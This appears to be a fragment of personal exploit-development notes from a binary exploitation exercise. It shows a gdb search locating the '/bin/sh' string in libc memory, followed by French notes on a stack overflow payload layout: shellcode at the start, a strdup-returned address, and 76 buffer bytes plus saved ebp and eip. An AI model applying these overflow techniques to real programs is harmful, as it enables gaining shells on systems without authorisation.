(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"


alors
on met le shellcode au debut du payload CAR
- 1) on a l'adresse exacte grce au retour de strdup
- 2) on alloue 76 pour buffer et notre payload est de 80 + 4 (donc 76 + 4 (ebp)+ 4(eip) la fin du shellcode est coupee car dans ebp